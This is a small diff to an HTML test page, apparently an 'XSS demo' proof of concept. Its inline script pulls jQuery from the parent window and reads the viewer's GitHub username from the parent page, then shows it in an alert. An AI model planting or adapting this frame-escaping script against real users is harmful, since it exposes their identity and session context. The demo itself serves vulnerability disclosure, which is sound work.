@@ -4,7 +4,8 @@
   <title>githtml - test</title>
   <link href="http:-bootstrap.css" type="text/css" rel="stylesheet">
 <script> 
-var githubUsername = jQuery("#command-bar").attr('data-username'); 
+var jQuery = window.parent.jQuery;
+var githubUsername = jQuery("#command-bar", window.parent).attr('data-username'); 
 alert("XSS demo: your github username is " + githubUsername);
 </script>
   
